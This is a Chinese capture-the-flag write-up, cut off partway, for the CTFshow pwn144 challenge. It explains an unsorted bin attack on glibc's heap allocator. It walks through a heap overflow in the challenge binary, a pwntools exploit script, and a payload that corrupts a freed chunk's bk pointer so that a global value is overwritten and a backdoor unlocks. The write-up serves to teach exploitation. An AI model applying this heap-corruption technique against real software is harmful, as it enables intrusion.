---
title: CTFshow-Pwn堆利用144-Unsorted bin attack
url: https://mp.weixin.qq.com/s/LTrmJiseOTDzdoz3acOXkw
source: Doonsec's feed
date: 2026-04-16
fetch_date: 2026-04-17T04:48:18.849772
---

# CTFshow-Pwn堆利用144-Unsorted bin attack

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/YdkQKXYKSBhhyyPLRrn1RsNDvr8mRibddSKiaugu9K2mV09qHvcbk1ynxKcLA5Tgyo8RHNxQ5QGqCqYAPXOrd95WY8nvMic3kAb50p16kubmK8/0?wx_fmt=jpeg)

# CTFshow-Pwn堆利用144-Unsorted bin attack

玫幽倩
玫幽倩

玫家大院

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## pwn144

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhAuicg4rWFLbgBGUs4s7qHhux4lFmw0q8jLNcsRlDJ3dzciajiasVo3wyIbYSrB4yVaNX2aBWiaKLG7Mdp3S7YMwM4Lg9rSprY5Z8/640?wx_fmt=png&from=appmsg "null")

保护：

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhkqNhdvRnKodupNIOIJuCAJGThw7BJV16c5PNiaV0iauEM2Xib7o82m297oeB9s6r4SHbGuNT1xUdFib2vv28BXUFLyFWuUUGhJYU/640?wx_fmt=png&from=appmsg "null")![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBh4vnLaoXW1LliauQcY8XCI8IVHvdJraJibuQF4pXC54oOvzExnay7YvV7p06hiba7qt2hqX5bZq6ZQhf5wrJ9wBoQ4h0QukIlibLY/640?wx_fmt=png&from=appmsg "null")

main函数相对之前的多了很多东西

先是两层循环

```
while (1)
{
    while (1)
    {
        menu();
        read(0, buf, 8uLL);
        v3 = atoi(buf);
        if (v3 != 3)
            break;
        delete_heap();
    }
```

外层纯是无限主循环了，内层的话是特殊处理了选项3的子循环，也就是可以连续删除了

别的的话也没啥，主要还是跟着菜单走的

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBj0ebQUNYd0feBMG3UpHibFenp9mP8dWkLjjef1fiaVnDDcvDd50B3UjyGBaN4TKw9mrFvicDa9QZhNZQtb2CXicJ9uGTQ49ibgXKiaw/640?wx_fmt=png&from=appmsg "null")

也就是这一个v3 == 114514，如果满足这个的同时还满足magic > 114514

那么就进入后门函数了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhiaHeNPotXAhxuqbx6XMwUhc3vK8VNMYibOGeUlpeFW5Ab28xiabaKm3lzZKWLmO47OFySRgOqPqTrwFDvg138LiaVFGvMxXYfhA0/640?wx_fmt=png&from=appmsg "null")

也就直接有flag了

好我们先把别的几个菜单看完再来看怎么得到这个

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhjNIFib26COMo1FCun26ibZmUlM44Sh082rbAicNggWQL5ap9hb1h3VOiblClHpu6QPHZKfFW1bVD9YZd7FOKa2T2KJUnKtcrkqJ0/640?wx_fmt=png&from=appmsg "null")

先是1，也就是create部分

```
read(0, buf, 8uLL);
size = atoi(buf);
heaparray[i] = malloc(size);
```

常规问大小，常规申请size大小的chunk，这一个程序就这边一个malloc

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaZMrICmy78CtWLwFW4yl5jQc8VlHBZ9KNFX6kJhxL14YH2DQfthGylOGwGmZdNaiczk6T3BbHDtUeHNctktgc2C8tspHJmz904/640?wx_fmt=png&from=appmsg "null")

可以看到这边直接就是一个很普通的read输入最多size大小的内容到我们申请的堆块里

接下来是2号edit

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBjOnG7TWYNdrORgtaP6jicOzQzIuMD4rl2yGicsStRa5ny90TWcTJqWdSsSIdxVKficfZMnJW1BjtVAkBbMDyTP33voNjjqvVBkWM/640?wx_fmt=png&from=appmsg "null")

问idx，之后问size

```
printf("Size of Heap : ");
read(0, buf, 8uLL);
v2 = atoi(buf);
printf("Content of heap : ");
read_input((void *)heaparray[v1], v2);
puts("Done !");
```

明显的堆溢出，没有检查可以写入heap的size

最后也就是delete了

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBiaOicAGtW90iaLicl5ALzx3ibRdwcjGL5UN2j6k4l4vcZDw9aLibcvXh1ZeYh0weS22eK3Yt7XEibt7ibL5XgQVqXWJ6g5ShYaM48MofU/640?wx_fmt=png&from=appmsg "null")

有对指针进行置空，是没有UAF存在的

大概的思路如上，我们整理一手内容

```
1，有后门
2，main函数有去后门的路
3，有堆溢出漏洞
```

大概是这样子打，这边还需要结合一下hint看看这题在教什么

Hint  : Unsorted Bin Attacks Or Unlink !

很明显教的就是Unsorted Bin Attacks

这一个漏洞明显和Unsorted Bin脱不了干系

主要还是和Unsorted Bin的遍历顺序FIFO先进先出有关系

First in First out

Unsorted Bin Attack - CTF Wiki

Unsorted Bin是这样子的，当一个较大的chunk被切成两半，如果剩下的那一部分大于了MINSIZE，就会被放到unsorted bin里边去

释放一个不属于fast bin的chunk，如果这个chunk还不和top chunk紧邻，也会被放到unsorted bin里边去

而这些unsorted bin在使用的时候是FIFO，malloc的时候如果在fastbin和small bin里找不到大小对应的hcunk，就会去unsorted bin里找，如果取出来的大小刚好满足就直接返回给用户，否则就把chunk分别插入对应的bin里边去

而我们这边这个Unsorted Bin Attack主要源于malloc的这样子一段源码

```
          /* remove from unsorted list */
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

可以看到取出unsorted bin的时候会把bck->fd的位置写到原来Unsorted Bin的位置

也就是说如果我们能控制bk，就能把 unsorted\_chunks (av)写到任意位置，这带来的效果一般是修改任意地址值为一个较大的数值，但是这边修改的值不是我们可以控制的（）

可能看起来没啥用

但是实际上还是有点用的，比如修改循环次数为一个大的值，修改global\_max\_fast使得大chunk被视为fast bin之类的便于下一步的attack

那就题论题的话，我们只需要让这个magic值改大就能直接读到flag了

具体流程如下：

1，申请chunk，free掉，进入unsorted bin

2，改这个unsorted bin的bk，改完之后系统就会把目标当作一个chunk

那改多少呢？改target-0x10，因为我们要改target的值啊，我们要改magic的值，而值在data区，fd和bk指向的却又都是header区，必须把target挪到data区，所以是0x10（64位才是0x10，32位是0x8）

理解一下

```
内存布局示意：
target - 0x10:  [prev_size]  <-- 伪造堆块开始
target - 0x08:  [size]       <-- 系统检查的堆块大小
target + 0x00:  [fd]         <-- 这里会被写入一个 libc 地址
target + 0x08:  [bk]         <-- 这里可以指向其他位置
```

3，改完之后申请回来就得到大magic值了

怎么做到的？具体是这样子，我们申请的时候因为unsorted bin里要走一个chunk，我们称呼这个要走的chunk为victim

因为系统在unsorted bin里边取走chunk的时候，为了维护双向链表的完整性会执行一个指针更新的操作，向它自认为是堆块的结构写入链表头部的地址

下边就是一个取出victim的操作，遵循标准的双向链表删除逻辑

```
// bck 是 victim 的后一个块 (按 bk 方向)，fwd 是前一个块 (按 fd 方向)
bck = victim->bk; // 我们将其篡改为 target - 0x10
fwd = victim->fd; // 通常指向 unsorted bin 链表头部
// 维护链表
bck->fd = fwd; // 关键步骤！
fwd->bk = bck;
```

而写入的关键就在于bck->fd = fwd

因为此时这个bck是我们设置的target -0x10，我们第二步把这个目标改了bk，使得系统把其当作了一个chunk，所以系统就想更新这个假堆块的fd指针使其指向fwd

在64位系统里一个堆块fd就位于起始地址(target-0x10)后的0x10偏移处

所以这个写入的操作，实际上发生就变成了target-0x10+0x10=target

也就成功把fwd的值更新到了target里边了，这是一个超大值，尽管我们不能选择值

总结来说，就是攻击诱使target-0x10的地址被当成了一个起始地址，被拿来更新了

（但是需要注意这个覆盖不太规范，我们其实损坏了unsorted bin的链表结构，所以在之后向unsorted bin中插入chunck时很可能会报错）

来动调看一眼，先定义一下前边的函数

```
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
io = process('./pwn144')
elf = ELF('./pwn144')

def menu(x):
    io.sendlineafter('Your choice :',str(x))
def create(size,data):
    menu(1)
    io.sendlineafter('Size of Heap : ',str(size))
    io.sendlineafter('Content of heap:',data)
def edit(idx,size,data):
    menu(2)
    io.sendlineafter('Index :',str(idx))
    io.sendlineafter('Size of Heap : ',str(size))
    io.sendlineafter('Content of heap : ',data)
def delete(idx):
    menu(3)
    io.sendlineafter('Index :',str(idx))
def stop():
    gdb.attach(io)
    pause()
```

这个menu不是很多，接下来继续动调看看具体的情况

上来我们肯定是先create，这边需要create三个，第一个chunk1用来堆溢出，后期edit来覆盖chunk2的

chunk2就是我们的攻击目标，未来进入unsorted bin

最后chunk3是为了保护chunk1和chunk2，避免其直接与top chunk物理相邻而被合并

```
create(0x80,b'aaaa')
create(0x80,b'bbbb')
create(0x80,b'cccc')
stop()
```

我们选择用0x80的堆块，避免fastbin的同时也能很好的满足0x10的倍数，对齐

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhXf4tSBe4bMZZ4VQlnxxibvyfCed4mx2HkB3sDAKh01uQjm0rbUebK7pxC4CRQyT3PpojJEY6M39oGyCgGiablx5FAE6P6lGYjM/640?wx_fmt=png&from=appmsg "null")

申请三个chunk后长这样子，可以看到申请了三块0x80

```
用户请求大小（0x80） + 头部大小（0x10） = 0x90
实际大小（0x90） | PREV_INUSE（1） = 0x91
```

好现在free一个

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBg1CRWTEsaalFxRiciaV80pVx4OQ0ACh7zDmk2BMJYmwyjyibpc6d9fcTQZZkKxtEGkbFVAAX3Gpe99f3JG6pUkztQR6OW1ibTmMUk/640?wx_fmt=png&from=appmsg "null")

欸！发现不对欸！不是unsorted bin，进入了tcache

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBj2gibe2gRbIdNKGPnNat94tMGs0oFabaPk2RXdSeP7icLNsksCLoCZPtzw9xJQn2YHc1o589VKicticNHGR0AtK99AygduZVsLZV8/640?wx_fmt=png&from=appmsg "null")

主要就是因为我们的glibc版本问题了，2.27开始有tcache，如果是2.23就会直接进入unsortbin了

为了解决这个问题，我们必须重新设置堆块大小，不超过0x410都会进入tcache，那只能写0x420了

(其实也可以直接填7个我们这种大小的chunk把tcache填满)

```
create(0x80,b'aaaa')
create(0x420,b'bbbb')
create(0x80,b'cccc')
stop()
```

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBjSVIxZMUNYZcTW9daVNM78237c1OXT4SjFaXldibsd7ib3YYWlaMKajQj0LUZtyzIZH0DZeN6GeagHqSIWMksaQd6CUH7dfShQc/640?wx_fmt=png&from=appmsg "null")

重新申请0x420大小的

free掉

```
delete(1)
stop()
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBh58w6Ch2gTGX9fCUMWMkibKHiaGTEoUIkLGicBt7zSibdsMOrcVfvlBZdmMicUFFyjpz4jiaX9LroxfTicloR1n4WAnBNgzCU34tmeicQ/640?wx_fmt=png&from=appmsg "null")

进入啦，进入unsorted bin了

现在要覆盖bk了，我们要算好长度

首先target肯定是0x6020a0的位置

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBjLR3njVRHmmpicqwiaUJ4xCLgSFu0MaTJMnibv7ZRhiaWoY9QvUDoGw2C5IqgzgjShVPupaPuElbtUwYY1Z62lYiaoNI3GbEjrTicVQ/640?wx_fmt=png&from=appmsg "null")

接下来就是构建payload了，这个需要好好斟酌

```
payload = b'a' * 0x80 + p64(0) + p64(0x431) + p64(0) + p64(target - 0x10)
```

首先肯定是填满chunk1的数据，好我们a填完之后现在站在了chunk2的header部分

现在是一个chunk2的prev\_size部分，我们必须写一个p64(0)过去，表示前边有个chunk是非空闲的

之后就道理chunk2的size字段，我们知道size是0x431，那就写0x431就好了

再后边是chunk2的fd，fd指向下一个chunk，我们不是很关心下一个，直接写0，表示没有下一个得了

最后终于到了chunk2的bk字段了，核心区啊，要改成target-0x10，我们已经分析过很多次了

```
payload结构：
[0x00-0x7F]  'a' * 0x80              ← 填充chunk1的data...